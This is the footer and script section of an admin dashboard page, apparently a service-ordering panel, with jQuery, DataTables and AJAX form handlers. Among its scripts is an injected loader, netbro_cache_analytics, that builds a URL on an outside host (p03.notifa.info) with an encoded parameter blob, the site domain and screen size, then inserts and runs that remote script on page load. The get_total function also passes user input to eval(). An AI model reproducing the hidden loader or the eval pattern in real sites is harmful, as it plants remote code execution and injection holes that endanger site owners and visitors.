</div>
</div>
  <footer class="footer text-right">
		<div class="container">
			<div class="row">
	<div class="col-xs-12 text-center">
		&copy; 2018 <b>Arvan Apriyana</b>
                            </div>
    </footer>


</div>
<!-- ./wrapper -->

<!-- jQuery  -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/detect.js"></script>
        <script src="../assets/js/fastclick.js"></script>

        <script src="../assets/js/jquery.slimscroll.js"></script>
        <script src="../assets/js/jquery.blockUI.js"></script>
        <script src="../assets/js/waves.js"></script>
        <script src="../assets/js/wow.min.js"></script>
        <script src="../assets/js/jquery.nicescroll.js"></script>
        <script src="../assets/js/jquery.scrollTo.min.js"></script>

        <!-- KNOB JS -->
        <!--[if IE]>
        <script type="text/javascript" src="assets/plugins/jquery-knob/excanvas.js"></script>
        <![endif]-->
        <script src="../assets/plugins/jquery-knob/jquery.knob.js"></script>

        <!--Morris Chart-->
		<script src="../assets/plugins/morris/morris.min.js"></script>
		<script src="../assets/plugins/raphael/raphael-min.js"></script>
        <script src="../assets/pages/jquery.morris.init.js"></script>
        <!-- Dashboard init -->
        <script src="../assets/pages/jquery.dashboard.js"></script>

        <!-- App js -->
        <script src="../assets/js/jquery.core.js"></script>
        <script src="../assets/js/jquery.app.js"></script>
        
        <!-- Datatables-->
        <script src="../assets/plugins/datatables/jquery.dataTables.min.js"></script>
        <script src="../assets/plugins/datatables/dataTables.bootstrap.js"></script>
        <script src="../assets/plugins/datatables/dataTables.buttons.min.js"></script>
        <script src="../assets/plugins/datatables/buttons.bootstrap.min.js"></script>
        <script src="../assets/plugins/datatables/jszip.min.js"></script>
        <script src="../assets/plugins/datatables/pdfmake.min.js"></script>
        <script src="../assets/plugins/datatables/vfs_fonts.js"></script>
        <script src="../assets/plugins/datatables/buttons.html5.min.js"></script>
        <script src="../assets/plugins/datatables/buttons.print.min.js"></script>
        <script src="../assets/plugins/datatables/dataTables.fixedHeader.min.js"></script>
        <script src="../assets/plugins/datatables/dataTables.keyTable.min.js"></script>
        <script src="../assets/plugins/datatables/dataTables.responsive.min.js"></script>
        <script src="../assets/plugins/datatables/responsive.bootstrap.min.js"></script>
        <script src="../assets/plugins/datatables/dataTables.scroller.min.js"></script>
        
        <script type="text/javascript">
            $(document).ready(function() {
                $('#datatable').dataTable();
                $('#datatable-keytable').DataTable( { keys: true } );
                $('#datatable-responsive').DataTable();
                $('#datatable-scroller').DataTable( { ajax: "../assets/plugins/datatables/json/scroller-demo.json", deferRender: true, scrollY: 380, scrollCollapse: true, scroller: true } );
                var table = $('#datatable-fixed-header').DataTable( { fixedHeader: true } );
            } );
            TableManageButtons.init();

        </script>
        
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m4gCC6t46jpRbxbpZrdVpmC7mEPc6eAaBlD3ja0vErDDwLfajczTSv98azHxVFRjDZaDHLc4Y%2b7FqyplO6UvpJ4%2fmPDwJXKYgDWfzqOCiAo2sNgredY9eLMUuOaltSp%2f0kzWqoRUO1MUfOooDKga%2b3GnBULng9P%2b3MmD1L17XV%2f%2fkbn%2bLQODKM2QQSrOkDh%2feYJOFgTjIlj%2bGTnRfgg520sJMiE1Mk2nm8lfKjqT4hamvNRw6AMXWSJRVI4saZoev4TaE%2fiv5KBzcV67jC%2bwt0freRk6BaYA1fm3%2feydlhinCLdpg3Gez%2bjjDHGx%2fMbcxXdxMylKNopP9OZM0qI%2btHncRpotyIHhvtQRuAEad6TMsbIgTO1VvA%2bqyCyVoQp4g4qVLM3k8bb9ar87tuG5DY8ipE9zf4YjyRBbo6UZ1p8VgRRmdAW28bskJlAysG1rIJv5qfPu0bf57t5PksDVNIJmQTiKcI42FZ1x8J9gzLSZP5An6548EnL6sKR4ekG4rb9maIoC%2brYpnduv8g3XKj3EmFlBpOb7V" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
<script type="text/javascript">
    $(document).ready(function(){
        $("#category").change(function(){
            var category = $("#category").val();
            $.ajax({
                url : '../inc/order_service.php',
                data  : 'category='+category,
                type  : 'POST',
                dataType: 'html',
                success : function(msg){
                    $("#service").html(msg);
                }
            });
        });
        $("#service").change(function(){
            var service = $("#service").val();
            $.ajax({
                url : '../inc/order_note.php',
                data  : 'service='+service,
                type  : 'POST',
                dataType: 'html',
                success : function(msg){
                    $("#note").html(msg);
                }
            });
            $.ajax({
                url : '../inc/order_rate.php',
                data  : 'service='+service,
                type  : 'POST',
                dataType: 'html',
                success : function(msg){
                    $("#rate").val(msg);
                }
            });
        });
    });
    function get_total(quantity) {
        var rate = $("#rate").val();
        var result = eval(quantity) * rate;
        $('#total').val(result);
    }
    </script>
<script type="text/javascript"> 
var htmlobjek; 
$(document).ready(function(){ 

  $("#level").change(function(){ 
    var level = $("#level").val(); 

    $.ajax({ 
        url    : '../inc/note_adduser.php', 
        data    : 'level='+level, 
        type    : 'POST', 
        dataType: 'html', 
        success    : function(msg){ 
                 $("#note").html(msg); 
            } 
    }); 
  }); 
}); 
</script>
	</body>

</html>